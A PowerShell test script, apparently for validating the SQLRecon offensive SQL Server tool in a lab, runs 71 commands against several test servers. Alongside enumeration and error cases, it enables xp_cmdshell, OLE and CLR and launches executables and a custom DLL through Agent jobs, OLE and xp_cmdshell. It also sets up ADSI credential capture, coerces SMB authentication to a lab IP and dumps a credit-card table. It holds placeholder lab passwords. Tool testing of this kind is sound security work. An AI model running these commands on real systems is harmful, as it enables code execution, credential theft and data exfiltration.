<#
    Execution instructions:
    powershell.exe -nop -exec bypass .\SQLRecon-Standard-Modules-Test.ps1
#>

<#
    The $global:* variables do not need to be changed.
    The only exception is $global:modules, which can be
    changed to match the number of test cases you execute.
#>
$global:count = 1
$global:modules = 71
$global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"

<#
    The $authentication variable acts as a quick way to
    switch the authentication type for the following commands.
#>
$authentication = "WinToken"
#$authentication = "WinDomain /domain:kawalabs /username:jsmith /password:Password123"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Local /username:sa /password:Password123"
#$authentication = "EntraID /domain:x.onmicrosoft.com /username:jsmith /password:Password123"
#$authentication = "AzureLocal /username:sa /password:Password123"

<#
    The following variables can be changed.
    - $sqlreconPath is the path to where SQLRecon is on disk.
    - $server1 is the hostname or IP of a SQL server.
    - $server2 is the hostname or IP of a SQL server, I use this for linked SQL servers.
    - $server3 is the hostname or IP of a SQL server, you might not need this.
    - $server4 is the hostname or IP of a SQL server, you might not need this.
    - $server5 is the hostname or IP of a SQL server, you might not need this.
    - outputPath is where you want to output the results of this script on disk in markdown.
      keep in mind that the path can not have special characters like ':'. '-' is fine.
#>
$sqlreconPath = ".\SQLRecon.exe"
$server1 = "SQL01"
$server2 = "SQL02"
$server3 = "SQL03"
$server4 = "MECM01"
$server5 = "sqlrecon.database.windows.net"
$authenticationFormatted = $authentication.replace(' ','-').replace('/','').replace('.','-').replace(':','-')
$outputPath = $PSScriptRoot + "\sqlrecon-standard-$authenticationFormatted-$global:timestamp.md"

<#
    .Description
    The Execute function executes a supplied SQLRecon command.
#>
Function Execute($command)
{
    Write-Output "($global:count/$global:modules)"
    Write-Output $command
    Write-Output ""
    Write-Output "Expected Output:"
    Write-Output '```'
    Invoke-Expression $command
    Write-Output '```'
    Write-Output ""
    $global:count++
}

# Configuring output to file.
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $outputPath

Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Standard Modules Test Cases"
Write-Output "[+] Variables Set:"
Write-Output "  |-> SQLRecon Path: $sqlreconPath"
Write-Output "  |-> Ouput Path: $outputPath"
Write-Output "  |-> Authentication: $authentication"
Write-Output "  |-> SQL Server 1: $server1"
Write-Output "  |-> SQL Server 2: $server2"
Write-Output "  |-> SQL Server 3: $server3" 
Write-Output "  |-> SQL Server 4: $server4" 
Write-Output "  |-> SQL Server 4: $server5" 
Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Write-Output ""

# Add test cases in this area. In this case there are 71, which is why $global:modules is set to 71.
Write-Output ""
Write-Output "[+] Executing commands - expected to fail to validate error handling"
Write-Output ""
Execute "$sqlreconPath /h"
Execute "$sqlreconPath /auth:invalidauth"
Execute "$sqlreconPath /auth:$authentication /host:invalidhost"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:invalidmodule"
Execute "$sqlreconPath /module"
Execute "$sqlreconPath /enum"
Execute "$sqlreconPath /enum:info"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:columns"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:query"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:query /c:'invalid query'"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:Payments /m:query /c:'select * from cc'"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:rows"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:search"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:smb"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:tables"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:columns /db:invaliddb /table:invalidtable"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:columns /db:Payments /table:cc"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:invaliddb /m:query /c:'select * from invalidtable'"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:rows /db:invaliddb /table:invalidtable"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:rows /db:AdventureWorks /table:SalesLT.Customer"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:invaliddb /m:search /keyword:card"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:Payments /m:search /keyword:card"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:tables /db:invalidtable"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:disablerpc"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:enablerpc"
Execute "$sqlreconPath /auth:$authentication /host:$server3 /module:adsi"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:agentcmd"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:clr"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:clr /dll:invalidpath /function:invalidfunction"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:olecmd"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:xpcmd"
Write-Output ""
Write-Output "[+] Executing unprivileged commands"
Write-Output ""
Execute "$sqlreconPath /help"
Execute "$sqlreconPath /enum:sqlspns"
Execute "$sqlreconPath /enum:sqlspns /domain:kawalabs.local"
Execute "$sqlreconPath /enum:info /port:1434 /timeout:1 /host:172.16.10.101,$server2"
Execute "$sqlreconPath /auth:$authentication /host:$server2,$server3 /m:checkrpc"
Execute "$sqlreconPath /auth:$authentication /host:$server2,$server3 /m:databases"
Execute "$sqlreconPath /auth:$authentication /host:$server2,$server3 /m:impersonate"
Execute "$sqlreconPath /auth:$authentication /host:$server2,$server3 /m:info"
Execute "$sqlreconPath /auth:$authentication /host:$server2,$server3 /m:links"
Execute "$sqlreconPath /auth:$authentication /host:$server2,$server3 /m:users"
Execute "$sqlreconPath /auth:$authentication /host:$server2,$server3 /m:whoami"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:columns /db:Payments /table:cc"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:query /database:Payments /c:'select * from cc'"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:rows /db:AdventureWorks /table:SalesLT.Customer"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:search /db:Payments /keyword:card"
Execute "$sqlreconPath /auth:$authentication /host:$server3 /m:smb /unc:\\172.16.10.21\test"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:tables /db:AdventureWorks"
Write-Output ""
Write-Output "[+] Executing privileged commands"
Write-Output ""
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:disablerpc /rhost:$server1\sqlexpress"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:disablerpc /rhost:$server2"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:disablerpc /rhost:$server3"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:disablerpc /rhost:$server3"
Execute "$sqlreconPath /auth:$authentication /host:$server3 /m:disablerpc /rhost:$server4"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:enablerpc /rhost:$server1\sqlexpress"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:enablerpc /rhost:$server2"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /m:enablerpc /rhost:$server3"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:enablerpc /rhost:$server3"
Execute "$sqlreconPath /auth:$authentication /host:$server3 /m:enablerpc /rhost:$server4"
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2,$server3,$server4 /m:disableclr"
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2,$server3,$server4 /m:disableole"
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2,$server3,$server4 /m:disablexp"
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2,$server3,$server4 /m:enableole"
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2,$server3,$server4 /m:enableclr"
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2,$server3,$server4 /m:enablexp"
Execute "$sqlreconPath /auth:$authentication /host:$server3 /m:adsi /adsi:linkadsi /lport:30000"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:agentstatus"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:agentcmd /subsystem:cmdexec /command:'c:\temp\mb-s1.exe'"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:agentcmd /c:'c:\temp\mb-s2.exe'"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:clr /dll:'c:\temp\sql.dll' /function:Chicken"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:olecmd /c:'c:\temp\mb-s3.exe'"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /m:xpcmd /c:'tasklist'"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Standard Modules Test Cases"
Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Stop-Transcript